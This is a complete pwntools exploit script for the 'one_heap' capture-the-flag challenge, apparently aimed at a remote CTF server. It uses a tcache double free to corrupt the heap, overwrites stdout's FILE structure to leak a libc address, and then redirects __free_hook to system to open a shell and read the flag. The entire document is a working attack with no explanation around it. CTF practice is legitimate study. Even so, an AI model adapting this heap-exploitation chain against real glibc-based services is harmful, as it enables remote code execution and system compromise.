from pwn import *

context.log_level = "debug"

bin = ELF("one_heap")
#libc = bin.libc
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

def Debug(cmd=""):
    gdb.attach(p)
    #pause()

def add(size,content):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("size:", str(size))
    p.sendlineafter("content:", content)

def delete():
    p.sendlineafter("choice:", "2")

def pwn(p):
    add(0x40,"")
    delete()
    delete()
    add(0x40,"\x10\xb0")
    add(0x40,"")
    add(0x40,p64(0)*2+'\x07'*0x18)
    delete()
    add(0x40,"")
    add(0x18,p16(0x2760))
    payload  = ""
    payload += p64(0xfbad3c80) #_flags= ((stdout->flags & ~ _IO_NO_WRITES)|_IO_CURRENTLY_PUTTING)|_IO_IS_APPENDING
    payload += p64(0)          #_IO_read_ptr
    payload += p64(0)          #_IO_read_end
    payload += p64(0)          #_IO_read_base
    payload += "\xc8"          # overwrite last byte of _IO_write_base to point to libc address
    # Debug()
    add(0x38,payload)
    libc_base = u64(p.recv(6)+'\x00\x00')-libc.sym['_IO_2_1_stdin_']
    success("libc_base-->"+hex(libc_base))
    if libc_base&0xfff !=0 and libc_base!=0 :
    	p.close()
    	return
    else:
    	libc.address=libc_base
    	pause()
    add(0x18,p64(0)+p64(libc.sym["__free_hook"]-8))
    add(0x7f,"/bin/sh\x00"+p64(libc.sym["system"]))
    #Debug()
    delete()
    p.sendline('id')
    p.recv()
    p.sendline('id')
    p.recv()
    p.sendline('id')
    p.recv()
    p.sendline('id')
    p.recv()


    p.sendline('cat flag')
    p.recv()
    p.sendline('cat flag')
    p.recv()
    p.interactive()

while True:
    try:
        # p = bin.process()
        p=remote('node3.buuoj.cn',29804)
        pwn(p)
    except Exception as e:
        p.close()
